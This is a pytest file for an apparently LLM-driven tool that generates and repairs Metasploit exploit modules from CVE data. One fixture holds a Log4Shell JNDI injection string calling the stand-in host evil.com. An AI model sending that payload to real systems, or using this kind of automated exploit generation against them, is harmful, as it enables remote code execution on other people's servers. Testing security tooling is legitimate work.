"""Tests for the SmartAgent generate and repair functions."""

from zero_forge.agents.smart_agent import generate_artifact, repair_artifact, _extract_code_block
from zero_forge.schemas import (
    Artifact,
    ArtifactType,
    CollectedContext,
    ValidationResult,
    VulnerabilityInput,
)


def test_extract_code_block_ruby():
    text = "Here is the code:\n```ruby\nclass Foo\nend\n```\nDone."
    result = _extract_code_block(text)
    assert "class Foo" in result
    assert "```" not in result


def test_extract_code_block_generic():
    text = "```\nputs 'hello'\n```"
    result = _extract_code_block(text)
    assert "puts 'hello'" in result


def test_extract_code_block_no_fence():
    text = "just raw code"
    result = _extract_code_block(text)
    assert result == "just raw code"


def test_generate_artifact_stub(monkeypatch):
    monkeypatch.delenv("OPENAI_API_KEY", raising=False)
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)

    vuln = VulnerabilityInput(cve_id="CVE-2021-44228")
    ctx = CollectedContext(
        cve_id="CVE-2021-44228",
        cve_description="Log4Shell RCE",
        poc_text="${jndi:ldap://evil.com}",
    )

    artifact = generate_artifact(vuln, ctx)
    assert artifact.artifact_type == ArtifactType.METASPLOIT
    assert "MetasploitModule" in artifact.content
    assert artifact.filename.endswith(".rb")
    assert "CVE-2021-44228" in artifact.metadata.get("cve_id", "")


def test_repair_artifact():
    artifact = Artifact(
        artifact_type=ArtifactType.METASPLOIT,
        content="class Foo\nend",
        filename="test.rb",
    )
    validation = ValidationResult(
        is_valid=False,
        errors=["Missing required method: 'exploit'"],
    )
    ctx = CollectedContext(cve_id="CVE-2021-44228")

    repaired = repair_artifact(artifact, validation, ctx)
    assert repaired.artifact_type == ArtifactType.METASPLOIT
    assert repaired.filename == "test.rb"
